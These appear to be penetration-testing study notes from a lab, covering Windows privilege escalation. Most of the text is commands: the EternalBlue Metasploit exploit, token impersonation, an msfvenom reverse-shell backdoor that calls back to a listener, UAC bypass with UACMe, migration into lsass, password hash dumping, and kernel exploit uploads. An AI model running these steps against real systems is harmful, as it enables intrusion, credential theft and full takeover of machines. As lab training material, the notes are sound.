# Access Token Impersonation

### Nmap Enum
```js
nmap 192.168.2.3 
```

### Metasploit
```js
msf6> search eternalblue
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> set rhosts 192.168.2.3
msf6> run

meterpreter> sysinfo
meterpreter> pgrep explorer   (or ps -S explorer.exe)
3512
meterpreter> migrate 3512
//[-] core migrate: Operation failerd: Access is denied.
meterpreter> getuid
meterpreter> getprivs        (SeImpersonatePriviledge)
meterpreter> load incognito      //if crashed run exploit again
meterpreter> list_tokens -u
meterpreter> impersonate_token "ATTACKDEFENSE\Administrator"  //(copied from delegation tokens )

meterpreter> getuid
meterpreter> getprivs   //gives error
meterpreter> pgrep explorer  //3512
meterpreter> migrate 3512
meterpreter> getprivs
meterpreter> list_tokens -u

meterpreter> impersonate_token "NT AUTHORITY\SYSTEM"
meterpreter> getuid
meterpreter> getprivs

"If there is no Delegation Tokens Available we can use Potato attack"

```

https://jlajara.gitlab.io/Potatoes_Windows_Privesc


https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato



# Bypassing UAC with UACMe

### Tools
https://github.com/dotfornet/UACME   -  UACMe

cmd> net localgroup administrators    (lists admini accs)

concept prompt  --> regular admin prompt
credential prompt   --> regular user prompt that requires admin credentials

![[Pasted image 20231009191215.png]]


### Nmap Enum
```js
nmap 192.168.2.3 
```

### Metasploit
```js
msf6> search eternalblue
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> set rhosts 192.168.2.3
msf6> run

meterpreter> sysinfo
meterpreter> pgrep explorer   (or ps -S explorer.exe)
2488
meterpreter> migrate 2488
meterpreter> sysinfo
meterpreter> getuid
meterpreter> getprivs
meterpreter> shell

C:> net user
C:> net localgroup administrators
C:> net user administrator password123
//Access is denied  (Because of UAC)
```


### Msfvenom generate shell
```js
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f exe > backdoor.exe
```

### Set Up Listener (Metasploit)
```js
msf6> use multi/handler
msf6> set payload windows/meterpreter/reverse_tcp    "Important!"
msf6> set LHOST 10.10.5.2
msf6> set LPORT 1234
msf6> run
```

### Meterpreter Session  (Old one)
```js
meterpreter> pwd
meterpreter> getuid
meterpreter> getprivs
meterpreter> cd C:\\
meterpreter> mkdir Temp
meterpreter> cd Temp
meterpreter> upload backdoor.exe
meterpreter> upload /root/Desktop/tools/UACME/Akagi64.exe
meterpreter> shell

C:> dir
C:> .\Akagai64.exe 23 C:\Temp\backdoor.exe   -->("23 is the method we use from documentation")
//this should make interact connection on our listener and give us new meterpreter session with higher priviledges

meterpreter> sysinfo
meterpreter> getprivs
meterpreter> ps -S lsass.exe
meterpreter> migrate 688  --> ("lsass.exe") //for NT AUTHORITY\SYSTEM

meterpreter> sysinfo
meterpreter> getuid   --> NT AUTHORITY\SYSTEM
meterpreter> hashdump
```


## Metasploit Module
```js
// after meterpreter session
msf6> use exploit/windows/local/bypassuac_injection
msf6> set payload windows/x64/meterpreter/reverse_tcp
msf6> set SESSION 1
msf6> set LPORT 4433
msf6> set TARGET Windows\ x64
msf6> run

meterpreter> getuid
meterpreter> getsystem
meterpreter> getuid   // NT AUTHORITY\SYSTEM
meterpreter> hashdump
```


# Windows Kernel Exploits

#### Tools 

Windows-Exploit-Suggester - This tool compares a targets patch levels against the
Microsoft vulnerability database in order to detect potential missing patches on the
target. It also notifies the user if there are public exploits and Metasploit modules
available for the missing bulletins.
+ GitHub: https://github.com/AonCyberLabs/Windows-Exploit-Suggester

Windows-Kernel- Exploits - Collection of Windows Kernel exploits sorted by CVE.
+ GitHub:
https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135


meterpreter> getprivs
meterpreter> getsystem

### Suggester (Metasploit)
```js
msf6> search suggester
msf6> use post/multi/recon/local_exploit_suggester
msf6> set session 3   (//depends on which session)
```

#### Github suggester
```js
get systeminfo from meterpreter and paste it into file (win7.txt in our case)

./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database 2021-12-26-mssb.xls --systeminfo ~/Desktop/win7.txt

//then we go here
"https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135"
download .exe file

meterpreter> upload ~/Downloads/exploit.exe
meterpreter> shell
C:\Temp> .\exploit.exe
```
